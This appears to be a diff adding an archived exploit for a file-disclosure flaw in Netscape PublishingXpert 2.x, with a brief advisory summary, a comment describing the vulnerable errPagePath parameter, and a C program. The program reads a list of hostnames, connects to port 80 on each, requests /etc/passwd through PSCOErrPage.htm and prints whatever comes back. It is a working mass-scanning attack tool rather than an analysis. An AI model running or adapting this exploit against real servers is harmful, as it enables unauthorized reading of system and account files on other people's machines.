@@ -1,0 +1,115 @@
+source: http://www.securityfocus.com/bid/2920/info
+
+Netscape PublishingXpert is an e-commerce application distributed by Netscape. PublishingXpert manages user information, sending them special ads and personalized content.
+
+PSCOErrPage.htm does not sufficiently validate input. A problem with PSCOErrPage.htm makes it possible for a remote user to view any file on the system.
+
+This makes it possible for a remote user to launch an information gathering attack, and potentially gain local access to the system. 
+
+/*
+
+  Netscape PublishingXpert 2.* file-reading/dir-listing
+  vuln in PSCOErrPage.htm by \x00\x00
+
+     0s vuln:
+      SunOS 5.6 and SunOS 5.5.1 (others versions affected possibly)
+
+
+ discription:
+      PSCOErrPage.htm is a error handler message page, when theirs
+      a server error usually you will get fowarded to this along
+      with a url query like this:
+
+ /PSUser/PSCOErrPage.htm?errPagePath=%2Fusr%2FPublishingXpert%2F2.5%2Fbin%2Fpsuser%2Fen%2Fcommon%2FPSCO_ErrPage.pat&errMsg=PUBSY
+S_35202%3A++The+two+passwords+provided+do+not+match
+%2F= /
+
+       so we can make this a little bit more visible by changing
+       the url to be more clearly visible for us. Lets also remove
+       that junk info "&errMsg=" and see what we have got...
+
+ /PSUser/PSCOErrPage.htm?errPagePath=/usr/PublishingXpert/2.5/bin/psuser/en/common/PSCO_ErrPage.pat
+
+       Yes, thats a fully specified filename, meaning we can input
+       whatever we want. In our case lets say we wanted to snag
+       /etc/passwd just request the fallowing:
+
+     exploit:
+       /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
+
+   Alot of big e-commernce sites are vuln to this, but luckily
+   scence the level of the cgi script dose not have root
+   permisions, meaning your shadow file and other root files are safe.
+  
+  Usage:
+        xpert <infile><outfile>
+
+*/
+
+
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <termios.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/syslog.h>
+#include <sys/param.h>
+#include <sys/times.h>
+#ifdef LINUX
+#include <sys/time.h>
+#endif
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/signal.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+int FLAG = 1;
+int Call(int signo)
+{
+ FLAG = 0;
+}
+
+main (int argc, char *argv[])
+{
+  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
+  int outsocket, serv_len, len,X,c,outfd;
+  struct hostent *nametocheck;
+  struct sockaddr_in serv_addr;
+  struct in_addr outgoing;
+
+  char rmpMessage[]="GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd\n";
+  while(fgets(hosta,100,stdin))
+  {
+    if(hosta[0] == '\0')
+    break;
+    hosta[strlen(hosta) -1] = '\0';
+    write(1,hosta,strlen(hosta)*sizeof(char));
+    write(1,"\n",sizeof(char));
+    outsocket = socket (AF_INET, SOCK_STREAM, 0);
+    memset (&serv_addr, 0, sizeof (serv_addr));
+    serv_addr.sin_family = AF_INET;
+     
+    nametocheck = gethostbyname (hosta);
+
+    (void *) memcpy (&outgoing.s_addr, nametocheck->h_addr_list[0], sizeof(outgoing.s_addr));
+    strcpy (host, inet_ntoa (outgoing));
+    serv_addr.sin_addr.s_addr = inet_addr (host);
+    serv_addr.sin_port = htons (80);
+    signal(SIGALRM,Call);
+    FLAG = 1;
+
+    alarm(10);    
+    X=connect (outsocket, (struct sockaddr *) &serv_addr, sizeof (serv_addr));
+    alarm(0);
+
+    if(FLAG == 1 && X==0){
+      write(outsocket,rmpMessage,strlen(rmpMessage)*sizeof(char));
+      while((X=read(outsocket,FileBuf,8096))!=0) write(1,FileBuf,X);
+    }
+  close (outsocket);   
+  }
+  return 0;
+}
+/*                    www.hack.co.za                    */
